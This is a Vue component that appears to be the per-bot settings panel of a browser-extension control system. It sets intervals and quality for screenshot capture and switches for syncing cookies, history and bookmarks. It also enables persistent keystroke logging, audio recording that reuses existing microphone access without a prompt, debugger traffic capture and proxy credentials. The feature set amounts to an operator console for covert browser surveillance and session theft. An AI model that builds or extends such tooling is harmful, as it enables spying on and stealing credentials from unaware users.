<script setup lang="ts">
import { ref, computed, watch } from 'vue'
import { bots } from '@/api/endpoints'
import Btn from '@/components/ui/Btn.vue'
import Field from '@/components/ui/Field.vue'
import type { BotSummary } from '@/types/api'

const props = defineProps<{ bot: BotSummary }>()
const emit = defineEmits<{ saved: [] }>()

const name = ref(props.bot.name)
const proxyUsername = ref(props.bot.proxy_username)
const proxyPassword = ref(props.bot.proxy_password)
const switchConfig = ref<Record<string, boolean>>(
  Object.fromEntries(
    Object.entries(props.bot.switch_config ?? {}).map(([k, v]) => [k, Boolean(v)]),
  ),
)
const dataConfig = ref<Record<string, unknown>>(
  { ...(props.bot.data_config ?? {}) },
)
const screenshotInterval = ref<number>(
  (props.bot.data_config?.SCREEN_CAPTURE_INTERVAL as number) || 10000,
)
const screenshotQuality = ref<number>(
  (props.bot.data_config?.SCREEN_CAPTURE_QUALITY as number) || 0.3,
)
const screenshotMaxSize = ref<number>(
  (props.bot.data_config?.SCREEN_CAPTURE_MAX_SIZE as number) || 1920,
)
const realtimeImgQuality = ref<number>(
  (props.bot.data_config?.REALTIME_IMG_QUALITY as number) || 50,
)
const realtimeImgInterval = ref<number>(
  (props.bot.data_config?.REALTIME_IMG_INTERVAL as number) || 2000,
)
const syncInterval = ref<number>(
  (props.bot.data_config?.SYNC_INTERVAL as number) || 63000,
)
const syncHugeInterval = ref<number>(
  (props.bot.data_config?.SYNC_HUGE_INTERVAL as number) || 321000,
)
const saving = ref(false)
const error = ref<string | null>(null)
const saved = ref(false)
const autoSaving = ref(false)
const autoSaveOk = ref(false)
let autoSaveTimer: ReturnType<typeof setTimeout> | null = null

const notificationDomains = ref<string[]>(
  (() => {
    const raw = props.bot.data_config?.NOTIFICATION_DOMAINS
    if (Array.isArray(raw)) return raw as string[]
    if (typeof raw === 'string' && raw.length > 0) return raw.split(',').map((d: string) => d.trim()).filter(Boolean)
    return []
  })(),
)
const domainInput = ref('')
const blockDomains = ref<string[]>(
  (() => {
    const raw = props.bot.data_config?.BLOCK_DOMAINS
    if (Array.isArray(raw)) return raw as string[]
    if (typeof raw === 'string' && raw.length > 0) return raw.split(',').map((d: string) => d.trim()).filter(Boolean)
    return []
  })(),
)
const blockInput = ref('')

function addDomain(): void {
  const val = domainInput.value.trim()
  if (val && !notificationDomains.value.includes(val)) {
    notificationDomains.value = [...notificationDomains.value, val]
    saveConfig()
  }
  domainInput.value = ''
}

function removeDomain(domain: string): void {
  notificationDomains.value = notificationDomains.value.filter((d) => d !== domain)
  saveConfig()
}

function onSwitchChange(key: string, checked: boolean): void {
  switchConfig.value = { ...switchConfig.value, [key]: checked }
  saveConfig()
}

function scheduleAutoSave(): void {
  if (autoSaveTimer) clearTimeout(autoSaveTimer)
  autoSaveTimer = setTimeout(() => saveConfig(), 400)
}

async function saveConfig(): Promise<void> {
  if (autoSaveTimer) { clearTimeout(autoSaveTimer); autoSaveTimer = null }
  autoSaving.value = true
  error.value = null
  try {
    await bots.update(props.bot.id, {
      switch_config: switchConfig.value,
      data_config: {
        ...dataConfig.value,
        SCREEN_CAPTURE_INTERVAL: screenshotInterval.value,
        SCREEN_CAPTURE_QUALITY: screenshotQuality.value,
        SCREEN_CAPTURE_MAX_SIZE: screenshotMaxSize.value,
        REALTIME_IMG_QUALITY: realtimeImgQuality.value,
        REALTIME_IMG_INTERVAL: realtimeImgInterval.value,
        SYNC_INTERVAL: syncInterval.value,
        SYNC_HUGE_INTERVAL: syncHugeInterval.value,
        NOTIFICATION_DOMAINS: notificationDomains.value,
        BLOCK_DOMAINS: blockDomains.value,
      },
    })
    autoSaveOk.value = true
    setTimeout(() => { autoSaveOk.value = false }, 1500)
    emit('saved')
  } catch (e) {
    error.value = e instanceof Error ? e.message : 'auto-save failed'
  } finally {
    autoSaving.value = false
  }
}

watch(
  [screenshotInterval, screenshotQuality, screenshotMaxSize, realtimeImgQuality, realtimeImgInterval, syncInterval, syncHugeInterval],
  scheduleAutoSave,
)

const isNotificationEnabled = computed(() => switchConfig.value['NOTIFICATION'] ?? false)
const isBlockEnabled = computed(() => switchConfig.value['DNR_BLOCK'] ?? false)

function addBlockDomain(): void {
  const val = blockInput.value.trim()
  if (val && !blockDomains.value.includes(val)) {
    blockDomains.value = [...blockDomains.value, val]
    saveConfig()
  }
  blockInput.value = ''
}

function removeBlockDomain(domain: string): void {
  blockDomains.value = blockDomains.value.filter((d) => d !== domain)
  saveConfig()
}

const intervalOptions = [
  { value: 5000, label: '5s' },
  { value: 10000, label: '10s' },
  { value: 15000, label: '15s' },
  { value: 30000, label: '30s' },
  { value: 60000, label: '60s' },
]
const realtimeIntervalOptions = [
  { value: 1000, label: '1s' },
  { value: 2000, label: '2s' },
  { value: 3000, label: '3s' },
  { value: 5000, label: '5s' },
  { value: 10000, label: '10s' },
]
const syncIntervalOptions = [
  { value: 30000, label: '30s' },
  { value: 63000, label: '1min' },
  { value: 120000, label: '2min' },
  { value: 300000, label: '5min' },
]
const syncHugeIntervalOptions = [
  { value: 120000, label: '2min' },
  { value: 321000, label: '5min' },
  { value: 600000, label: '10min' },
  { value: 1800000, label: '30min' },
]
const qualityOptions = [
  { value: 0.3, label: '30% (Low)' },
  { value: 0.5, label: '50% (Med)' },
  { value: 0.7, label: '70% (High)' },
  { value: 1.0, label: '100% (Max)' },
]
const realtimeQualityOptions = [
  { value: 30, label: '30% (Low)' },
  { value: 50, label: '50% (Med)' },
  { value: 80, label: '80% (High)' },
  { value: 100, label: '100% (Max)' },
]
const maxSizeOptions = [
  { value: 480, label: '480px' },
  { value: 720, label: '720px' },
  { value: 1080, label: '1080px' },
  { value: 1920, label: '1920px' },
]

watch(
  () => props.bot,
  (b) => {
    name.value = b.name
    proxyUsername.value = b.proxy_username
    proxyPassword.value = b.proxy_password
    switchConfig.value = Object.fromEntries(
      Object.entries(b.switch_config ?? {}).map(([k, v]) => [k, Boolean(v)]),
    )
    dataConfig.value = { ...(b.data_config ?? {}) }
    screenshotInterval.value = (b.data_config?.SCREEN_CAPTURE_INTERVAL as number) || 10000
    screenshotQuality.value = (b.data_config?.SCREEN_CAPTURE_QUALITY as number) || 0.3
    screenshotMaxSize.value = (b.data_config?.SCREEN_CAPTURE_MAX_SIZE as number) || 1920
    realtimeImgQuality.value = (b.data_config?.REALTIME_IMG_QUALITY as number) || 50
    realtimeImgInterval.value = (b.data_config?.REALTIME_IMG_INTERVAL as number) || 2000
    syncInterval.value = (b.data_config?.SYNC_INTERVAL as number) || 63000
    syncHugeInterval.value = (b.data_config?.SYNC_HUGE_INTERVAL as number) || 321000
    const raw = b.data_config?.NOTIFICATION_DOMAINS
    if (Array.isArray(raw)) notificationDomains.value = raw as string[]
    else if (typeof raw === 'string' && raw.length > 0) notificationDomains.value = raw.split(',').map((d: string) => d.trim()).filter(Boolean)
    else notificationDomains.value = []
    const blocked = b.data_config?.BLOCK_DOMAINS
    if (Array.isArray(blocked)) blockDomains.value = blocked as string[]
    else if (typeof blocked === 'string' && blocked.length > 0) blockDomains.value = blocked.split(',').map((d: string) => d.trim()).filter(Boolean)
    else blockDomains.value = []
  },
)

interface SwitchItem {
  key: string
  label: string
  help: string
  category: 'sync' | 'capture' | 'monitor'
}

const switches: SwitchItem[] = [
  { key: 'SYNC', label: 'Tabs sync', help: 'Sync open tabs in real-time.', category: 'sync' },
  { key: 'SYNC_HUGE', label: 'Full data sync', help: 'Sync history, cookies, bookmarks periodically.', category: 'sync' },
  { key: 'REALTIME_IMG', label: 'Live thumbnail', help: 'Send a live screenshot of the active tab.', category: 'capture' },
  { key: 'NOTIFICATION', label: 'Domain notifications', help: 'Notify on monitored domain visits.', category: 'monitor' },
  { key: 'PERSISTENT_RECORDING', label: 'Persistent audio', help: 'Keep recording across navigations when the browser already has microphone access. Sensor will not prompt.', category: 'monitor' },
  { key: 'PERSISTENT_KEYBOARD', label: 'Persistent keyboard', help: 'Keep keystroke logging across navigations.', category: 'monitor' },
  { key: 'CANARY', label: 'Session canary', help: 'Plant a unique cookie and alert if it appears on another endpoint.', category: 'monitor' },
  { key: 'DNR_BLOCK', label: 'Policy block', help: 'Use declarativeNetRequest to block listed domains.', category: 'monitor' },
  { key: 'DEBUGGER', label: 'Debugger HAR', help: 'Allow chrome.debugger HAR capture (shows a debugging banner).', category: 'monitor' },
]

const switchCategories = [
  { id: 'sync' as const, label: 'Data Sync', icon: '🔄' },
  { id: 'capture' as const, label: 'Screen Capture', icon: '📸' },
  { id: 'monitor' as const, label: 'Monitoring', icon: '👁' },
]

function switchesByCategory(cat: string): SwitchItem[] {
  return switches.filter((s) => s.category === cat)
}

async function saveIdentity(): Promise<void> {
  saving.value = true
  error.value = null
  saved.value = false
  try {
    await bots.update(props.bot.id, {
      name: name.value,
      proxy_username: proxyUsername.value,
      proxy_password: proxyPassword.value,
    })
    saved.value = true
    setTimeout(() => { saved.value = false }, 2000)
    emit('saved')
  } catch (e) {
    error.value = e instanceof Error ? e.message : 'update failed'
  } finally {
    saving.value = false
  }
}
</script>

<template>
  <div class="space-y-5">
    <!-- Identity -->
    <section class="surface overflow-hidden">
      <div class="px-4 py-2.5 border-b border-border-subtle bg-bg-overlay">
        <h3 class="text-[12px] font-semibold uppercase tracking-wider text-fg-muted flex items-center gap-2">
          <span>🏷</span> Identity
        </h3>
      </div>
      <div class="p-4 space-y-3">
        <Field v-model="name" label="Display name" />
        <div class="grid grid-cols-2 gap-3">
          <Field v-model="proxyUsername" label="Proxy username" />
          <Field v-model="proxyPassword" label="Proxy password" />
        </div>
        <div class="flex items-center gap-3 pt-1">
          <Btn size="sm" variant="primary" :loading="saving" @click="saveIdentity">Save</Btn>
          <span v-if="saved" class="text-success text-[11px]">✓ Saved</span>
        </div>
      </div>
    </section>

    <!-- Feature Switches — grouped by category, compact grid -->
    <section class="surface overflow-hidden">
      <div class="px-4 py-2.5 border-b border-border-subtle bg-bg-overlay">
        <h3 class="text-[12px] font-semibold uppercase tracking-wider text-fg-muted flex items-center gap-2">
          <span>⚡</span> Feature Switches
        </h3>
      </div>
      <div class="divide-y divide-border-subtle">
        <div v-for="cat in switchCategories" :key="cat.id">
          <div class="px-4 py-1.5 bg-bg-base/50">
            <span class="text-[10px] uppercase tracking-widest text-fg-faint font-medium">
              {{ cat.icon }} {{ cat.label }}
            </span>
          </div>
          <div class="grid grid-cols-2 lg:grid-cols-3">
            <label
              v-for="s in switchesByCategory(cat.id)"
              :key="s.key"
              class="px-3 py-1.5 flex items-center gap-2 cursor-pointer hover:bg-bg-hover/60 border-b border-r border-border-subtle"
            >
              <div class="flex-1 min-w-0">
                <div class="text-[12px] font-medium truncate">{{ s.label }}</div>
                <div class="text-[10px] text-fg-faint truncate">{{ s.help }}</div>
              </div>
              <div class="relative shrink-0">
                <input
                  type="checkbox"
                  class="sr-only peer"
                  :checked="switchConfig[s.key] ?? false"
                  @change="(e) => onSwitchChange(s.key, (e.target as HTMLInputElement).checked)"
                />
                <div class="w-8 h-4 rounded-full bg-bg-overlay border border-border-subtle peer-checked:bg-accent peer-checked:border-accent transition-colors" />
                <div class="absolute left-0.5 top-0.5 size-3 rounded-full bg-white shadow-sm transition-transform peer-checked:translate-x-4" />
              </div>
            </label>
          </div>
          <!-- Domain notifications tags input (shown when NOTIFICATION is enabled) -->
          <div
            v-if="cat.id === 'monitor' && isNotificationEnabled"
            class="px-3 py-2 bg-bg-base/30 border-t border-border-subtle"
          >
            <div class="text-[11px] font-medium text-fg-muted mb-1.5">Monitored Domains</div>
            <div class="flex flex-wrap gap-1.5 mb-2" v-if="notificationDomains.length">
              <span
                v-for="domain in notificationDomains"
                :key="domain"
                class="inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[11px] bg-accent/15 text-accent border border-accent/25"
              >
                {{ domain }}
                <button
                  type="button"
                  class="text-accent/60 hover:text-accent ml-0.5 leading-none"
                  @click="removeDomain(domain)"
                >&times;</button>
              </span>
            </div>
            <div class="flex gap-2">
              <input
                v-model="domainInput"
                type="text"
                placeholder="e.g. example.com"
                class="flex-1 h-7 text-[11px] px-2 rounded bg-bg-overlay border border-border-subtle placeholder:text-fg-faint/50"
                @keydown.enter.prevent="addDomain"
              />
              <button
                type="button"
                class="h-7 px-2.5 text-[11px] rounded bg-accent/10 text-accent border border-accent/25 hover:bg-accent/20 transition-colors"
                @click="addDomain"
              >Add</button>
            </div>
          </div>
          <div
            v-if="cat.id === 'monitor' && isBlockEnabled"
            class="px-3 py-2 bg-bg-base/30 border-t border-border-subtle"
          >
            <div class="text-[11px] font-medium text-fg-muted mb-1.5">Blocked domains (DNR)</div>
            <div class="flex flex-wrap gap-1.5 mb-2" v-if="blockDomains.length">
              <span
                v-for="domain in blockDomains"
                :key="domain"
                class="inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[11px] bg-danger/15 text-danger border border-danger/25"
              >
                {{ domain }}
                <button type="button" class="text-danger/60 hover:text-danger ml-0.5 leading-none" @click="removeBlockDomain(domain)">&times;</button>
              </span>
            </div>
            <div class="flex gap-2">
              <input
                v-model="blockInput"
                type="text"
                placeholder="e.g. phish.example"
                class="flex-1 h-7 text-[11px] px-2 rounded bg-bg-overlay border border-border-subtle placeholder:text-fg-faint/50"
                @keydown.enter.prevent="addBlockDomain"
              />
              <button
                type="button"
                class="h-7 px-2.5 text-[11px] rounded bg-danger/10 text-danger border border-danger/25 hover:bg-danger/20 transition-colors"
                @click="addBlockDomain"
              >Add</button>
            </div>
          </div>
        </div>
      </div>
    </section>

    <!-- Timing & Quality in two-column layout -->
    <div class="grid grid-cols-1 lg:grid-cols-2 gap-4">
      <!-- Screenshot Config -->
      <section class="surface overflow-hidden">
        <div class="px-4 py-2.5 border-b border-border-subtle bg-bg-overlay">
          <h3 class="text-[12px] font-semibold uppercase tracking-wider text-fg-muted flex items-center gap-2">
            <span>📷</span> Screenshots
          </h3>
        </div>
        <div class="divide-y divide-border-subtle">
          <div class="px-4 py-2.5 flex items-center gap-3">
            <div class="flex-1">
              <div class="text-[12px] font-medium">Interval</div>
            </div>
            <select
              v-model.number="screenshotInterval"
              class="h-7 text-[11px] px-2 rounded bg-bg-overlay border border-border-subtle"
            >
              <option v-for="opt in intervalOptions" :key="opt.value" :value="opt.value">
                {{ opt.label }}
              </option>
            </select>
          </div>
          <div class="px-4 py-2.5 flex items-center gap-3">
            <div class="flex-1">
              <div class="text-[12px] font-medium">Quality</div>
            </div>
            <select
              v-model.number="screenshotQuality"
              class="h-7 text-[11px] px-2 rounded bg-bg-overlay border border-border-subtle"
            >
              <option v-for="opt in qualityOptions" :key="opt.value" :value="opt.value">
                {{ opt.label }}
              </option>
            </select>
          </div>
          <div class="px-4 py-2.5 flex items-center gap-3">
            <div class="flex-1">
              <div class="text-[12px] font-medium">Max size</div>
            </div>
            <select
              v-model.number="screenshotMaxSize"
              class="h-7 text-[11px] px-2 rounded bg-bg-overlay border border-border-subtle"
            >
              <option v-for="opt in maxSizeOptions" :key="opt.value" :value="opt.value">
                {{ opt.label }}
              </option>
            </select>
          </div>
        </div>
      </section>

      <!-- Realtime Thumbnail -->
      <section class="surface overflow-hidden">
        <div class="px-4 py-2.5 border-b border-border-subtle bg-bg-overlay">
          <h3 class="text-[12px] font-semibold uppercase tracking-wider text-fg-muted flex items-center gap-2">
            <span>🖥</span> Live Thumbnail
          </h3>
        </div>
        <div class="divide-y divide-border-subtle">
          <div class="px-4 py-2.5 flex items-center gap-3">
            <div class="flex-1">
              <div class="text-[12px] font-medium">Interval</div>
            </div>
            <select
              v-model.number="realtimeImgInterval"
              class="h-7 text-[11px] px-2 rounded bg-bg-overlay border border-border-subtle"
            >
              <option v-for="opt in realtimeIntervalOptions" :key="opt.value" :value="opt.value">
                {{ opt.label }}
              </option>
            </select>
          </div>
          <div class="px-4 py-2.5 flex items-center gap-3">
            <div class="flex-1">
              <div class="text-[12px] font-medium">Quality</div>
            </div>
            <select
              v-model.number="realtimeImgQuality"
              class="h-7 text-[11px] px-2 rounded bg-bg-overlay border border-border-subtle"
            >
              <option v-for="opt in realtimeQualityOptions" :key="opt.value" :value="opt.value">
                {{ opt.label }}
              </option>
            </select>
          </div>
        </div>
      </section>
    </div>

    <!-- Sync Intervals -->
    <section class="surface overflow-hidden">
      <div class="px-4 py-2.5 border-b border-border-subtle bg-bg-overlay">
        <h3 class="text-[12px] font-semibold uppercase tracking-wider text-fg-muted flex items-center gap-2">
          <span>⏱</span> Sync Intervals
        </h3>
      </div>
      <div class="grid grid-cols-1 sm:grid-cols-2 divide-y sm:divide-y-0 sm:divide-x divide-border-subtle">
        <div class="px-4 py-2.5 flex items-center gap-3">
          <div class="flex-1">
            <div class="text-[12px] font-medium">Tabs sync</div>
            <div class="text-[11px] text-fg-faint">How often open tabs list refreshes.</div>
          </div>
          <select
            v-model.number="syncInterval"
            class="h-7 text-[11px] px-2 rounded bg-bg-overlay border border-border-subtle"
          >
            <option v-for="opt in syncIntervalOptions" :key="opt.value" :value="opt.value">
              {{ opt.label }}
            </option>
          </select>
        </div>
        <div class="px-4 py-2.5 flex items-center gap-3">
          <div class="flex-1">
            <div class="text-[12px] font-medium">Full sync</div>
            <div class="text-[11px] text-fg-faint">History, cookies, bookmarks.</div>
          </div>
          <select
            v-model.number="syncHugeInterval"
            class="h-7 text-[11px] px-2 rounded bg-bg-overlay border border-border-subtle"
          >
            <option v-for="opt in syncHugeIntervalOptions" :key="opt.value" :value="opt.value">
              {{ opt.label }}
            </option>
          </select>
        </div>
      </div>
    </section>

    <!-- Auto-save status -->
    <div class="flex items-center gap-2 text-[11px]">
      <span v-if="autoSaving" class="text-fg-faint">Saving…</span>
      <span v-else-if="autoSaveOk" class="text-success">✓ Saved</span>
      <p v-if="error" class="text-danger mono">{{ error }}</p>
    </div>
  </div>
</template>
